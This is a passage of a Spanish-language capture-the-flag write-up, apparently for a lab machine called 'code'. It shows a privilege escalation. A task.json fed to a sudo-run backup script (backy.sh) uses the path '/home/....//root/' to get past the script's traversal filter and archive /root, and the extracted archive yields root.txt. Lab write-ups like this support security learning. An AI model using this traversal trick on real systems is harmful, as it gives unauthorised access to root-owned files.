+<p>Ingresamos a home y luego a la subcarpeta app-production, dentro de esta carpeta, encontramos el archivo user.txt.</p>
+
+<pre>martin@code:~$ nano task.json 
+martin@code:~$ cat task.json 
+{
+        "destination": "/home/martin/",
+        "multiprocessing": true,
+        "verbose_log": true,
+        "directories_to_archive": [
+                "/home/....//root/"
+        ]
+}
+</pre>
+<p>Cambiemos la task.json para obtener el root.txt</p>
+
+<pre>martin@code:~/backups$ sudo /usr/bin/backy.sh ./task.json
+2025/05/20 02:53:46 🍀 backy 1.2
+2025/05/20 02:53:46 📋 Working with ./task.json ...
+2025/05/20 02:53:46 💤 Nothing to sync
+2025/05/20 02:53:46 📤 Archiving: [/home/../root]
+2025/05/20 02:53:46 📥 To: /home/martin/backups ...
+2025/05/20 02:53:46 📦
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  code_home_.._root_2025_May.tar.bz2  task.json
+martin@code:~/backups$ tar -xjf code_home_.._root_2025_May.tar.bz2
+martin@code:~/backups$ ls
+code_home_app-production_app_2024_August.tar.bz2  code_home_.._root_2025_May.tar.bz2  root  task.json
+martin@code:~/backups$ cd root
+martin@code:~/backups/root$ ls
+root.txt  scripts
+</pre>
+<p>Volvemos a ejecutar el script backy.sh con sudo usando el archivo task.json modificado, que ahora incluye la ruta para archivar /root.</p>
+<p>Extraemos el contenido del backup con tar -xjf. Esto crea un nuevo directorio llamado root con el contenido del backup.</p>
+<p>Dentro del directorio root, encontramos archivo root.txt, para asi finalizar la maquina.</p>
+
+  
   </body>
 </html>
